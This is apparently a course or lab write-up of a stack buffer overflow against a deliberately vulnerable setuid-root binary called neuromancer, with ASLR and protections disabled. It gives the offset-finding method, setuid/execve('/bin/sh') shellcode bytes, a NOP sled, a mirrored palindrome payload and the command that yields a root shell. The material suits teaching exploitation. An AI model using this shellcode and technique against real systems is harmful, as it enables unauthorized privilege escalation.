Binary exploitation is about finding a vulnerability in a binary file and exploiting it. This is often done by exploiting a buffer overflowLinks to an external site., which results in us messing with the addresses to trick the binary into executing malicious code. In a buffer overflow, the buffer that we write to is overfilled so that we instead write outside of the allocated memory space.  When we can access memory locations outside of the allocated memory space, we can write and execute malicious code there.

For this hack, we were provided with a vulnerable binary that we could use for our binary exploitation.

For the vulnerability to exist, we also have to disable Address space layout randomization (ASLR). This will make sure that we have control over the addresses and able to perform the exploit. We have also compiled the file without the protection mechanisms that exists to check for possible vulnerabilities.

Regarding the exploit itself, we saw that neuromancer.out runs with root privileges (ls -la), yet is executable by us as a non-privileged user. Moreover, the program has an array that is written to with strcpy, without checking any bounds. We can confirm this by passing a long string of characters, e.g., print('A' * 200) in Python.

Overflowing the buffer will cause a segmentation fault. If we try this with the letter 'A' inside GDB, we can type info frame after the segmentation fault to confirm that

```
saved rip = 0x4141414141414141 // 64-bit instruction pointer
```

What happened here is that we wrote 'A' (0x41) outside the intended boundaries which overwrote the instruction pointer, among other things.

What if we could write our own instruction pointer to the system? To accomplish this, we must first find where exactly the instruction pointer is. We can do this by filling the buffer with some type of distinct pattern. In our case we'll use the alphabet.

```
alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
```

Now we stuff the buffer with this string:
```
print((alphabet + alphabet[::-1])*4)
```
[::-1] is a Python trick for reversing strings.

Feeding the above alphabet string into neuromancer inside GDB and checking info frame results in
```
saved rip = 0x4443424141424344
```
By consulting an ASCII tableLinks to an external site., we see that this corresponds to 'DCBAABCD.' This is the meeting point between two alphabets. This means that the string

```
'ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBAABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBAABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBAABCD'
```
overwrote the entire instruction pointer. If we count the characters up until this point (len() in Python), we get 160. We need 160 bytes (characters) in total, including the entire instruction pointer.

We will now construct a payload to exploit neuromancer and obtain root privileges.

We're constructing a payload like this
```
[shellcode][NOP ... NOP][address]
^                           ^
|                           |
 ---------------------------
```
The idea behind this challenge is to overwrite the instruction pointer on the system when neuromancer executes. We will use this to control the flow of execution and point it towards our own code. A classic buffer overflow, in other words.

However, the palindrome check forces us to create a mirrored payload:

```
[sserdda][NOP ... NOP][shellcode][edocllehs][NOP ... NOP][address]
               ^                                             ^
               |                                             |
                ---------------------------------------------
```

Other than the mirroring, the palindrome does not pose any further obstacles. We can just assemble the regular payload and mirror with [::-1]. We'll also add NOP instructions leading up to our shellcode. They will make it easy for us to find an applicable return address compared to calculating an exact position.

Starting off, we'll import some useful libraries

```
import sys
import struct
```
Before moving on, we also need some form of shellcode to execute. A setuid(0) + execve(/bin/sh) shellcode from
http://shell-storm.org/shellcode/files/shellcode-77.phpLinks to an external site. should work:

```
shellcode = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
```
This takes care of the [shellcode]. We can use the same [::-1] trick to get its mirror [edocllehs] later.

Now we have everything ready to go. Let's start by overflowing with the alphabet again and recording the memory address it prints out, such as

```
start = 0x7fffffffe440
```
Note that the leading zeros are truncated in the printout. This is the full 64-bit address: 0x00007fffffffe440. Let's also calculate our offset address (without double zeros):

```
address = start + 0xB # start + 11
```
This should take us into the NOP section before our shellcode.  This means the next instruction will be executed until something of value (our shellcode) is encountered. This technique is called a NOP-sled or NOP-slide.

We're now going to pack our address into a proper byte format.

```
address_little = struct.pack('Q', address)
address_big = struct.pack('>Q', address)
```
Note the endianness used. Buckeye runs little endian, meaning the address bytes are stored in reverse order. By also packing it in big endian, we end up with the mirror bytes required for the palindrome check.

We now have the [address] and [sserdda] parts of our exploit.

Let's figure out the [NOP ... NOP] sections now, the padding in other words. First, let's store the NOP instruction.

```
padchar = b'\x90'
```
\x90 is usually the 'numerical' value of the NOP instruction in x86 Assembly. So, how many NOP instruction do we need?

The total payload is 160 bytes. The shellcode is 48 bytes.

```
160 - (48*2) = 64.
```
Then, we have both addresses of 8 each.
```
64 - 16 = 48
```
So 24 NOP on each side, right? (48/2)

Not quite.

Remember the leading zeros in the memory addresses?

0x00007fffffffe440?

Double zeros = \x00 = null byte. We do not want null bytes in our exploit. These can, for example, signal the end of a string instead, but it depends on the system in question. But, what to do about them in the memory addresses?

Well, for our purposes we choose to do nothing. More specifically, we should realize that our payload will look like this

```
00007fffffffe440[...]044efffffff70000
```
Therefore, if we skip overwriting the last 2 bytes (0000) we can use null bytes already written in the instruction pointer!

This means we have 2 bytes less in our payload, i.e.

```
160 - 2 = 158 # Final required payload length
```
The final amount of NOP instructions is therefore
```
158 - 48 - 48 - 6 - 6 = 50 # The addresses without zeros take up 6 bytes
```
So, 25 NOP instructions for each section.

```
padding_length = 25
padding = padchar * padding_length
```
That's a lot of work for just two bytes! But all that's left now is to assemble the payload:
```
payload = address_big + padding + shellcode + shellcode[::-1] +
padding + address_little
```
And print it without null bytes so we can painlessly feed it to neuromancer:
```
sys.stdout.buffer.write(payload.strip(b'\x00'))
```
Now, we can execute neuromancer in the terminal (without GDB):
```
./neuromancer $(python3 exploit.py)
```
And our reward very likely a segmentation fault! This is not a problem, though. All we have to do is update our start address with whatever neuromancer printed for us and try again. Now our reward is the coveted root prompt!